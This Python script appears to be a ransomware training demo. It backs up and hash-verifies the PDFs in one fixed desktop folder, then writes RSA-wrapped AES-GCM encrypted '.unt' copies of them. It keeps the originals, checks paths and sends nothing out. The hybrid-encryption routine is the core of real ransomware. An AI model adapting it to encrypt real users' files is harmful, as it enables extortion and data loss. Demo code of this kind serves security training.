from pathlib import Path
import hashlib
import json
import shutil
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes

base = Path.home() / "Desktop" / "RansomDemo"
source = base / "critical_tk0667"
backup = base / "original_backup" / "critical_tk0667"
manifest_file = base / "original_backup" / "manifest.json"
public_file = base / "keys" / "public.pem"

if not source.is_dir() or source.is_symlink():
    raise SystemExit("Missing critical_tk0667 folder")
if not public_file.is_file() or public_file.is_symlink():
    raise SystemExit("Missing keys/public.pem")

pdfs = sorted(p for p in source.rglob("*") if p.is_file() and p.suffix.lower() == ".pdf")
if not pdfs:
    raise SystemExit("No PDF files found")
if any(p.is_symlink() or not p.resolve().is_relative_to(source.resolve()) for p in pdfs):
    raise SystemExit("Unsafe PDF path")
if any((p.parent / (p.name + ".unt")).exists() for p in pdfs):
    if manifest_file.is_file() and all((p.parent / (p.name + ".unt")).is_file() for p in pdfs):
        print("Already encrypted:", len(pdfs))
        raise SystemExit(0)
    raise SystemExit("Some .unt files already exist. Check the training folder")
if any((backup / p.relative_to(source)).exists() for p in pdfs):
    raise SystemExit("Backup files already exist. Do not overwrite them")

rsa = PKCS1_OAEP.new(RSA.import_key(public_file.read_bytes()), hashAlgo=SHA256)
items = []
for p in pdfs:
    relative = p.relative_to(source)
    target = backup / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(p, target)
    sha = hashlib.sha256(p.read_bytes()).hexdigest()
    if hashlib.sha256(target.read_bytes()).hexdigest() != sha:
        raise SystemExit("Backup verification failed: " + str(relative))
    items.append({"file": relative.as_posix(), "sha256": sha})

manifest_file.parent.mkdir(parents=True, exist_ok=True)
manifest_file.write_text(json.dumps(items, indent=2), encoding="utf-8")
for p in pdfs:
    content = p.read_bytes()
    key = get_random_bytes(32)
    aes = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = aes.encrypt_and_digest(content)
    encrypted_key = rsa.encrypt(key)
    payload = b"UNTDEMO2" + len(encrypted_key).to_bytes(2, "big") + encrypted_key
    payload += bytes([len(aes.nonce)]) + aes.nonce + tag + ciphertext
    destination = p.parent / (p.name + ".unt")
    destination.write_bytes(payload)
    print("Created:", destination)
print("Done:", len(pdfs), "PDF encrypted copies")
